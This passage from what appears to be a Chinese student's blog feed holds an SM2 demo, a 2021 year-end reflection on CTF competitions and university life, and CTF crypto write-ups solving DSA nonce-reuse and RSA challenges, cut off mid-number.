<span class="keyword">in</span> <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;%s%s%s&#x27;</span>% (x2,M,y2))])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(M)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign_and_verify</span>():</span></span><br><span class="line">    sk1, pk1 = key.gen_key()</span><br><span class="line">    sm2_user = SM2(sk1, pk1)</span><br><span class="line">    data = <span class="string">b&#x27;sh1kaku&#x27;</span>*<span class="number">100</span></span><br><span class="line">    sign_data = sm2_user.sign(data)</span><br><span class="line">    <span class="built_in">print</span>(sm2_user.verify(sign_data, data))</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_and_decrypt</span>():</span></span><br><span class="line">    sk1, pk1 = key.gen_key()</span><br><span class="line">    sm2_user = SM2(sk1, pk1)</span><br><span class="line">    data = <span class="string">b&#x27;sh1kaku&#x27;</span>*<span class="number">100</span></span><br><span class="line">    en = sm2_user.encrypt(data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;åŠ å¯†åï¼š&#x27;</span>, en)</span><br><span class="line">    de = sm2_user.decrypt(en)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;è§£å¯†ï¼š&#x27;</span>, de)</span><br><span class="line"></span><br><span class="line">sign_and_verify()</span><br><span class="line">encrypt_and_decrypt()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;å¤§åˆ›æ’¸äº†ä¸ªsm2ï¼ˆæ°´ä¸€ä¸‹åšå®¢&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://sh1k4ku.github.io/categories/Crypto/"/>
    
    
    <category term="SM" scheme="http://sh1k4ku.github.io/tags/SM/"/>
    
  </entry>
  
  <entry>
    <title>2021.end</title>
    <link href="http://sh1k4ku.github.io/2021/12/31/2021/2021-end/"/>
    <id>http://sh1k4ku.github.io/2021/12/31/2021/2021-end/</id>
    <published>2021-12-31T07:53:55.000Z</published>
    <updated>2021-12-31T10:04:07.339Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹        æœ¬æ¥å¹¶ä¸æ‰“ç®—å†™å¹´ç»ˆæ€»ç»“çš„ï¼Œä½†æƒ³ç€è¿˜æ˜¯éšä¾¿å†™ç‚¹å§ï¼Œæ‰€ä»¥è¿˜æ˜¯å†™ç‚¹å§ï¼Œæ—¢æ˜¯å›é¡¾ï¼Œä¹Ÿæ˜¯è‡ªçœã€‚</p><span id="more"></span><p>â€‹        æ€»çš„æ¥è¯´ï¼Œ2021å¹´ç»™æˆ‘ç•™ä¸‹çš„å°è±¡å¹¶ä¸å¥½ï¼Œæˆ–è®¸æ˜¯ç–«æƒ…çš„åŸå› ï¼Œå¯¼è‡´å¾ˆå¤šäº‹éƒ½è¿›è¡Œçš„ä¸é¡ºåˆ©ã€‚æ— è®ºæ˜¯å“ªä¸ªæ–¹é¢ï¼Œè‡ªå·±éƒ½æœ‰äº†å¾ˆå¤§çš„å˜åŒ–ï¼Œæˆ–å¥½æˆ–åï¼Œéƒ½ä¸å¾—è€ŒçŸ¥ï¼Œæ€»ä¹‹å°±æ˜¯è¿™æ ·äº†ã€‚</p><p>â€‹        é¦–å…ˆæœ€æƒ³è¯´çš„è¿˜å¾—æ˜¯CTFï¼Œæ¯•ç«Ÿè¿™ä¸ªæ­å»ºè¿™ä¸ªblogçš„ç›®çš„å°±æ˜¯è®°å½•+å­¦ä¹ ã€‚ä»å»å¹´æ–°ç”Ÿèµ›ä¹‹åå¾ˆé•¿ä¸€æ®µæ—¶é—´åªæ˜¯åœ¨çœ‹ç†è®ºï¼Œæ²¡æœ‰å»åšé¢˜å®æˆ˜ï¼Œå¯¼è‡´æœ€åˆè¿›æ­¥çš„å¹¶ä¸å¿«ï¼Œä¸è¿‡è¿™ä¹Ÿä¸æˆ‘ä¸ªäººæ€§æ ¼æœ‰å…³ï¼Œé«˜ä¸­æ—¶å­¦æ•°å­¦çš„æ—¶å€™ä¾¿æ˜¯å¦‚æ­¤ï¼Œæˆ‘å¾€å¾€å–œæ¬¢å»çœ‹ï¼Œæ¬²åœ¨æ€è€ƒä¸­ç©·å°½æŸä¸€åŸç†æˆ–æŸä¸€é¢˜ï¼Œè€Œä¸å–œæ¬¢åŠ¨ç¬”æ¨å¯¼è®¡ç®—ï¼Œè¢«æ•°å­¦è€å¸ˆä¸Šè¯¾æ‰¹è¯„è¿‡å¤šæ¬¡23333ã€‚å½“ç„¶ï¼Œæˆ‘å¹¶ä¸è§‰å¾—è¿™æ˜¯ä¸€ä»¶åäº‹ï¼Œæˆ‘éå¸¸äº«å—æ€è€ƒçš„è¿‡ç¨‹ï¼Œåœ¨ç°åœ¨å­¦ä¹ çš„æ—¶å€™ä¹Ÿä¿æŒç€è¿™ä¸ªä¹ æƒ¯ã€‚ä»Šå¹´4æœˆä»MRCTFï¼ˆè¢«åŠæ‰“ï¼‰åï¼Œç»ˆäºçŸ¥é“å¤§èµ›æ˜¯æ€ä¹ˆä¸€ä¸ªæ¨¡å¼ï¼ˆæˆ–è€…è¯´éš¾åº¦ï¼Ÿï¼‰ï¼Œç®—æ˜¯æ­£å¼å…¥å‘ã€‚</p><p>â€‹        ä¹‹åå°è±¡æ¯”è¾ƒæ·±çš„æ˜¯å›½èµ›ï¼Œå°±åœ¨æœŸä¸­è€ƒè¯•å‰ï¼Œæ•´ä¸ªteamèšé›†åœ¨ä¸€ä¸ªå¤§æ•™å®¤ï¼Œéå¸¸æœ‰æ°›å›´æ„Ÿã€‚æˆ‘è®°å¾—å½“å¤©10ç‚¹è¦è€ƒè‹±è¯­ï¼Œæˆ‘ä»¬8ç‚¹å»ç½‘å®‰å¤§æ¥¼é›†åˆç­”é¢˜ã€‚9ç‚¹40çš„æ—¶å€™åŠ¨èº«å»è€ƒè‹±è¯­ï¼Œç»“æœå¿«åˆ°æ•™å®¤çš„æ—¶å€™å‘ç°ğŸ‘´æ²¡å¸¦å¬åŠ›è€³æœºï¼Œèµ¶ç´§å¾€å›è·‘å»ä¹°ä¸ªè€³æœºåˆå›è€ƒåœºï¼Œç„¶åè‹±è¯­è€ƒè¯•å°±å¯„äº†ã€‚é‚£èƒ½å’‹åŠå˜›ï¼Œè€ƒå®Œè‹±è¯­æ¥ç€å›ç½‘å®‰æ¥¼åç€ï¼Œæ— ç¼è¡”æ¥å›½èµ›ï¼Œçœ‹ç€å¤§ğŸ”¥å¹²åŠ²æ»¡æ»¡ï¼Œè¿™æ„Ÿè§‰çœŸæ˜¯å¤ªæ£’äº†ã€‚</p><p>â€‹        æš‘å‡åˆ°ä¸‹åŠå¹´å¼€å­¦åä¸€ä¸ªæœˆæ‰“äº†å¾ˆå¤šæ¯”èµ›ï¼Œè§…ğŸäººæ–—èƒ†å»äº†ä¸¤æ¬¡çº¿ä¸‹ï¼Œæœç„¶éƒ½æ˜¯åç‰¢ï¼Œå®‰æ´µæ¯å°±åœ¨æˆéƒ½ï¼ŒAWDæ¨¡å¼ï¼ŒåŒ–èº«æ— æƒ…äº¤flagæœºå™¨ã€‚æ”¶è·å°±æ˜¯æ—…æ¸¸ï¼‹äº†è§£çº¿ä¸‹æ¨¡å¼ã€‚å¸Œæœ›æ˜å¹´èƒ½å¤Ÿå†å­¦ä¸€ä¸ªæ–¹å‘ï¼Œçº¿ä¸‹ç»™é˜Ÿå‹ä¸€ç‚¹å¸®åŠ©ï¼Œæ‹¿æ›´é«˜çš„åæ¬¡ï¼ˆæ—…æ¸¸ä¹Ÿå¾ˆæ£’å•Šï¼‰</p><p>â€‹        &lt;â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-æˆ‘æ˜¯åˆ†å‰²çº¿â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-&gt;</p><p>â€‹            ç°åœ¨æ‰å‘è§‰ä»¥å‰æ‰€çŸ¥ç”šå°‘ï¼Œè¿›å…¥å¤§å­¦åæ‰é™†é™†ç»­ç»­æ¥è§¦è¿™ä¸ªç¤¾ä¼šï¼Œæ‰ä¼šå‘ç°ç°å®æ˜¯è¿œæ¯”æ–‡è‰ºä½œå“ä¸­æ›´ä¸ºç¦»è°±ã€‚åœ¨äº†è§£åˆ°æŸäº›äº‹åï¼Œä¼šæ„Ÿåˆ°å¦‚æ­¤çš„éœ‡æƒŠã€æ„¤æ‡‘ã€‚æœ‰æ—¶å€™ç»å¸¸ä¼šé’»ç‰›è§’å°–ï¼Œé™·å…¥å†…è€—çš„çŠ¶æ€ã€‚è¿™å­¦æœŸé€‰äº†ä¸€é—¨å«ã€Šä¸­åæ–‡åŒ–å“²å­¦ç¯‡ã€‹çš„è¯¾ï¼Œå—ç›ŠåŒªæµ…ã€‚æˆªå–æˆ‘çš„è¯¾åæ„Ÿä¸­çš„ä¸€éƒ¨åˆ†ï¼š</p><p><img src="/images/2021-end/image-20211231164908017.png" alt="image-20211231164908017"></p><p><img src="/images/2021-end/image-20211231165016407.png" alt="image-20211231165016407"></p><p>æœ€å¼€å§‹ä¸Šè¯¾å½“ç„¶æ˜¯æ»‘æ°´å“ˆå“ˆå“ˆï¼Œä½†è‡ªä»æ”¾äº†ç‹å¾·å³°è€å¸ˆè®²åº§åä¾¿è‚ƒç„¶èµ·æ•¬äº†ï¼Œåªæ€ªè‡ªå·±ä¸èƒ½æ›´æ—©æ„è¯†åˆ°è¿™äº›ã€‚ç¦»è°±çš„äº‹å¤ªå¤šäº†ï¼Œè¦æ”¹å˜æ›´æ˜¯éš¾äºä¸Šé’å¤©ï¼Œä½†è¿˜æ˜¯è¦åšä¸€ä¸ªæœ‰è¡€æœ‰è‚‰çš„äººã€‚</p><p>â€‹        ç”±äºæŸäº›åŸå› ï¼Œä¸ŠåŠå¹´å€Ÿäº†hxdä¸€ç¬”é’±ï¼Œä¹Ÿæ­£æ˜¯è¿æ°”å¥½ï¼Œä¸‹åŠå¹´æ‹¿äº†å›½å¥–ã€‚å½“æ—¶è¯„é€‰ç»“æœå‡ºæ¥çš„æ—¶å€™ï¼Œæˆ‘çš„ç¬¬ä¸€æƒ³æ³•ä¸æ˜¯å–œæ‚¦ï¼Œè€Œæ˜¯èƒ½è¿˜é’±äº†ï¼Œè¿˜æ˜¯å‡­æœ¬äº‹è¿˜çš„ï¼Œè¿™æ¯”å¥–å­¦é‡‘æœ¬èº«æ›´ä»¤äººé«˜å…´ã€‚åæ¥å’Œhxdè¯´èµ·æ¥çš„æ—¶å€™ï¼Œä»–è¿˜å‘Šè¯‰æˆ‘ä¸€å¼€å§‹æ€•æˆ‘è¿‡çš„ä¸å¥½ï¼Œéƒ½æ²¡æ‰“ç®—è¦æˆ‘è¿˜é’±ï¼Œå‘œå‘œï¼Œæœ€åè¿˜æ˜¯è¿˜äº†ï¼Œä½†è¿˜æ˜¯æœ‰è¢«æ„ŸåŠ¨åˆ°ã€‚</p><p>â€‹        è™½ç„¶è€æ—©ä»¥å‰å°±æœ‰äº†ç›®æ ‡ï¼Œä½†å› ä¸ºç†æƒ³å’Œç°å®çš„å†²çªï¼Œä»æ—§ä¼šè¿·èŒ«ã€‚2021è¿™ä¸€å¹´ä¸€ç›´åœ¨æ€è€ƒï¼Œæ€è€ƒå¾ˆå¤šå¾ˆå¤šä¸œè¥¿ï¼Œå¤§å¤šæ— æœï¼Œç´¢æ€§å°±ä¸å»ç®¡å®ƒï¼Œå€’ä¹Ÿç¡çš„è¸å®ã€‚å¯èƒ½ä¸æ˜¯æˆ‘çš„é—®é¢˜ï¼Œè€Œæ˜¯æ—¶é—´çš„é—®é¢˜ã€‚</p><p>â€‹        æœ€åï¼Œ2021å¹´çš„æœ€åä¸€ç‚¹æ—¶é—´é‡Œï¼Œç»ˆç©¶æ˜¯è¢«æ—¶é—´èƒŒåˆºäº†ã€‚</p><p>â€‹        æˆ‘ä¸æ—§äº‹å½’äºå°½,æ¥å¹´ä¾æ—§è¿èŠ±å¼€ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;â€‹        æœ¬æ¥å¹¶ä¸æ‰“ç®—å†™å¹´ç»ˆæ€»ç»“çš„ï¼Œä½†æƒ³ç€è¿˜æ˜¯éšä¾¿å†™ç‚¹å§ï¼Œæ‰€ä»¥è¿˜æ˜¯å†™ç‚¹å§ï¼Œæ—¢æ˜¯å›é¡¾ï¼Œä¹Ÿæ˜¯è‡ªçœã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="life" scheme="http://sh1k4ku.github.io/categories/life/"/>
    
    
  </entry>
  
  <entry>
    <title>è¥¿æ¹–è®ºå‰‘</title>
    <link href="http://sh1k4ku.github.io/2021/11/21/2021/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/"/>
    <id>http://sh1k4ku.github.io/2021/11/21/2021/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/</id>
    <published>2021-11-21T11:49:53.000Z</published>
    <updated>2023-04-16T14:55:48.056Z</updated>
    
    <content type="html"><![CDATA[<p>é¢˜ç›®è¿˜ä¸é”™ï¼Œéš¾åº¦æ¢¯åº¦æœ‰ç‚¹å¤§ï¼Œå‡ºäº†ä¸‰é“ï¼Œåé¢ä¸‰é“éš¾çš„éƒ½ä¸ä¼šåš</p><p>é¢å‘WPå­¦ä¹ </p><span id="more"></span><h1 id="unknown-dsa"><a href="#unknown-dsa" class="headerlink" title="unknown_dsa"></a>unknown_dsa</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> DSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,powmod</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,m1,m2,ul,vl,wl</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>():</span></span><br><span class="line">    key = DSA.generate(<span class="built_in">int</span>(<span class="number">1024</span>))</span><br><span class="line">    q = key.q</span><br><span class="line">    p = key.p</span><br><span class="line">    g = key.g</span><br><span class="line">    x1 = bytes_to_long(flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>])</span><br><span class="line">    x2 = bytes_to_long(flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">assert</span> x1&lt;q <span class="keyword">and</span> x2&lt;q</span><br><span class="line">    t = powmod(g, p*q-(p+q), p*q)</span><br><span class="line">    hm1 = bytes_to_long(SHA.new(m1).digest())</span><br><span class="line">    hm2 = bytes_to_long(SHA.new(m2).digest())</span><br><span class="line">    k = random.randint(<span class="number">1</span>, q-<span class="number">1</span>)</span><br><span class="line">    r1 = powmod(g, k, p) % q</span><br><span class="line">    s1 = (hm1 + x1*r1) * invert(k, q) % q</span><br><span class="line">    s2 = (hm2 + x1*r1) * invert(k, q) % q</span><br><span class="line">    r2 = powmod(g, x1, p) % q</span><br><span class="line">    s3 = (hm1 + x2*r2) * invert(k, q) % q</span><br><span class="line">    <span class="built_in">print</span>(p*q, (p-<span class="number">1</span>)//q, t, sep=<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r1, s1, s2, sep=<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r2, s3, sep=<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ul)):</span><br><span class="line">        <span class="keyword">assert</span> ul[i]**<span class="number">2</span> - wl[i]* vl[i]**<span class="number">2</span>==<span class="number">1</span></span><br><span class="line">    e = <span class="number">7</span></span><br><span class="line">    cl1 = [<span class="built_in">int</span>(powmod(bytes_to_long(m1), e, x)) <span class="keyword">for</span> x <span class="keyword">in</span> ul]</span><br><span class="line">    cl2 = [<span class="built_in">int</span>(powmod(bytes_to_long(m2), e, y)) <span class="keyword">for</span> y <span class="keyword">in</span> vl]</span><br><span class="line">    <span class="built_in">print</span>(wl, cl1, cl2, sep=<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    encrypt()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[3912956711, 4013184893, 3260747771], [2852589223779928796266540600421678790889067284911682578924216186052590393595645322161563386615512475256726384365091711034449682791268994623758937752874750918200961888997082477100811025721898720783666868623498246219677221106227660895519058631965055790709130207760704, 21115849906180139656310664607458425637670520081983248258984166026222898753505008904136688820075720411004158264138659762101873588583686473388951744733936769732617279649797085152057880233721961, 301899179092185964785847705166950181255677272294377823045011205035318463496682788289651177635341894308537787449148199583490117059526971759804426977947952721266880757177055335088777693134693713345640206540670123872210178680306100865355059146219281124303460105424], [148052450029409767056623510365366602228778431569288407577131980435074529632715014971133452626021226944632282479312378667353792117133452069972334169386837227285924011187035671874758901028719505163887789382835770664218045743465222788859258272826217869877607314144, 1643631850318055151946938381389671039738824953272816402371095118047179758846703070931850238668262625444826564833452294807110544441537830199752050040697440948146092723713661125309994275256, 10949587016016795940445976198460149258144635366996455598605244743540728764635947061037779912661207322820180541114179612916018317600403816027703391110922112311910900034442340387304006761589708943814396303183085858356961537279163175384848010568152485779372842]</span></span><br><span class="line"><span class="string">85198615386075607567070020969981777827671873654631200472078241980737834438897900146248840279191139156416537108399682874370629888207334506237040017838313558911275073904148451540255705818477581182866269413018263079858680221647341680762989080418039972704759003343616652475438155806858735982352930771244880990190318526933267455248913782297991685041187565140859, 106239950213206316301683907545763916336055243955706210944736472425965200103461421781804731678430116333702099777855279469137219165293725500887590280355973107580745212368937514070059991848948031718253804694621821734957604838125210951711527151265000736896607029198, 60132176395922896902518845244051065417143507550519860211077965501783315971109433544482411208238485135554065241864956361676878220342500208011089383751225437417049893725546176799417188875972677293680033005399883113531193705353404892141811493415079755456185858889801456386910892239869732805273879281094613329645326287205736614546311143635580051444446576104548</span></span><br><span class="line"><span class="string">498841194617327650445431051685964174399227739376, 376599166921876118994132185660203151983500670896, 187705159843973102963593151204361139335048329243</span></span><br><span class="line"><span class="string">620827881415493136309071302986914844220776856282, 674735360250004315267988424435741132047607535029</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>dsaéƒ¨åˆ†æ˜¯æœ€åŸºæœ¬çš„å½¢å¼ï¼Œå°±å·®H(m1)å’ŒH(m2)</p><p>m1å’Œm2ç»è¿‡ä¸‰æ¬¡RSAåŠ å¯†ï¼Œä½†æ¨¡æ•°æœªçŸ¥</p><p>æ¨¡æ•°ç”±ä½©å°”æ–¹ç¨‹è§£å‡ºï¼Œå†ç”¨ä½æŒ‡æ•°å¹¿æ’­å¯æ‹¿åˆ°m^7ï¼Œå¼€æ ¹å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,powmod,iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> DSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">n,k,t = <span class="number">85198615386075607567070020969981777827671873654631200472078241980737834438897900146248840279191139156416537108399682874370629888207334506237040017838313558911275073904148451540255705818477581182866269413018263079858680221647341680762989080418039972704759003343616652475438155806858735982352930771244880990190318526933267455248913782297991685041187565140859</span>, <span class="number">106239950213206316301683907545763916336055243955706210944736472425965200103461421781804731678430116333702099777855279469137219165293725500887590280355973107580745212368937514070059991848948031718253804694621821734957604838125210951711527151265000736896607029198</span>, <span class="number">60132176395922896902518845244051065417143507550519860211077965501783315971109433544482411208238485135554065241864956361676878220342500208011089383751225437417049893725546176799417188875972677293680033005399883113531193705353404892141811493415079755456185858889801456386910892239869732805273879281094613329645326287205736614546311143635580051444446576104548</span></span><br><span class="line">wl, cl1, cl2 =[<span class="number">3912956711</span>, <span class="number">4013184893</span>, <span class="number">3260747771</span>], [<span class="number">2852589223779928796266540600421678790889067284911682578924216186052590393595645322161563386615512475256726384365091711034449682791268994623758937752874750918200961888997082477100811025721898720783666868623498246219677221106227660895519058631965055790709130207760704</span>, <span class="number">21115849906180139656310664607458425637670520081983248258984166026222898753505008904136688820075720411004158264138659762101873588583686473388951744733936769732617279649797085152057880233721961</span>, <span class="number">301899179092185964785847705166950181255677272294377823045011205035318463496682788289651177635341894308537787449148199583490117059526971759804426977947952721266880757177055335088777693134693713345640206540670123872210178680306100865355059146219281124303460105424</span>], [<span class="number">148052450029409767056623510365366602228778431569288407577131980435074529632715014971133452626021226944632282479312378667353792117133452069972334169386837227285924011187035671874758901028719505163887789382835770664218045743465222788859258272826217869877607314144</span>, <span class="number">1643631850318055151946938381389671039738824953272816402371095118047179758846703070931850238668262625444826564833452294807110544441537830199752050040697440948146092723713661125309994275256</span>, <span class="number">10949587016016795940445976198460149258144635366996455598605244743540728764635947061037779912661207322820180541114179612916018317600403816027703391110922112311910900034442340387304006761589708943814396303183085858356961537279163175384848010568152485779372842</span>]</span><br><span class="line"></span><br><span class="line">q = <span class="number">895513916279543445314258868563331268261201605181</span></span><br><span class="line">p = k*q + <span class="number">1</span></span><br><span class="line">g = <span class="number">8065494126227608731057119338486910291529176576096612311734285061607284964658737003594964324046804258074712614189778906098614765392123515385260406254416427321997510822217750260108595410657401</span></span><br><span class="line"></span><br><span class="line">r1, s1, s2  = <span class="number">498841194617327650445431051685964174399227739376</span>, <span class="number">376599166921876118994132185660203151983500670896</span>, <span class="number">187705159843973102963593151204361139335048329243</span></span><br><span class="line">r2, s3 = <span class="number">620827881415493136309071302986914844220776856282</span>, <span class="number">674735360250004315267988424435741132047607535029</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_pell</span>(<span class="params">N, numTry = <span class="number">1000</span></span>):</span></span><br><span class="line">    cf= continued_fraction(sqrt(N))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numTry):</span><br><span class="line">        denom = cf.denominator(i)</span><br><span class="line">        numer = cf.numerator(i)</span><br><span class="line">        <span class="keyword">if</span> numer^<span class="number">2</span>-N*denom^<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> numer,denom</span><br><span class="line"></span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">ul = []</span><br><span class="line">vl = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(wl)):</span><br><span class="line">    uli,vli = solve_pell(wl[i])</span><br><span class="line">    ul.append(uli)</span><br><span class="line">    vl.append(vli)</span><br><span class="line">    <span class="built_in">print</span>(uli**<span class="number">2</span> - wl[i]* vli**<span class="number">2</span>==<span class="number">1</span>)</span><br><span class="line">m1 = crt(cl1,ul)</span><br><span class="line">m2 = crt(cl2,vl)</span><br><span class="line">m1 = iroot(m1,<span class="number">7</span>)[<span class="number">0</span>]</span><br><span class="line">m2 = iroot(m2,<span class="number">7</span>)[<span class="number">0</span>]</span><br><span class="line">m1 = long_to_bytes(m1)</span><br><span class="line">m2 = long_to_bytes(m2)</span><br><span class="line">hm1 = bytes_to_long(SHA.new(m1).digest())</span><br><span class="line">hm2 = bytes_to_long(SHA.new(m2).digest())</span><br><span class="line"></span><br><span class="line">k = (hm1-hm2) * invert(s1-s2,q) % q</span><br><span class="line">x = (s1*k-hm1) * invert(r1,q) %q</span><br><span class="line">x1 = long_to_bytes(x)</span><br><span class="line"></span><br><span class="line">x2 = (s3*k-hm1) * invert(r2,q) %q</span><br><span class="line">x2 = long_to_bytes(x2)</span><br><span class="line"><span class="built_in">print</span>(x1+x2)</span><br><span class="line"><span class="comment">#b&#x27;DASCTF&#123;f11bad18f529750fe52c56eed85d001b&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="hardrsa"><a href="#hardrsa" class="headerlink" title="hardrsa"></a>hardrsa</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p**<span class="number">4</span>*q</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = gmpy2.lcm(p - <span class="number">1</span>, q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">dp = d % (p - <span class="number">1</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;dp = &quot;</span> + <span class="built_in">str</span>(dp))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;c = &quot;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"></span><br><span class="line">y = <span class="number">44970334770928732898244681231887015823036968862589430795360407450241325804526550249636599838356211991556508051807736083970500405821178436965648667830700734869199113661014291937277978277911150712910111067455923538839208211341730600205012421590480302689440015519427542483457794250015041044005766067946091864535737609561307972017214830209789373403478845812233381675916260588887953159421766192154729316428193492066993541708015683307252835851180775774855434861595797766378476212474655463815269346958076100243779383709410133840801740725198611658924052362534096402553135744670626387184348914306862050102028442178124387967529206026887635325085436918918292605520422900256822484643691815324572051445023443317071731108386859147718606189628279088085079747165832132412733470443843035484477013198004966851635077493962536990986990636217401562807825803963811106484232497999786774640480645732952869072275732237315867082720335059080939093298661680553316871468683417496521124286320107648212715257177496058091531802230341811134640629521757156415557376537151974932592214587512839590911225424202751240056485544410132542771064321269076827204888141198883001198505921804868431134941576444176036476294269272283485028798539955904245747094258045651639518863791630381405577735773889426403798894595146841686164720465889383775336185166757318592077927263588512714934884506447812184346278936711269867378000543614439357383249820365905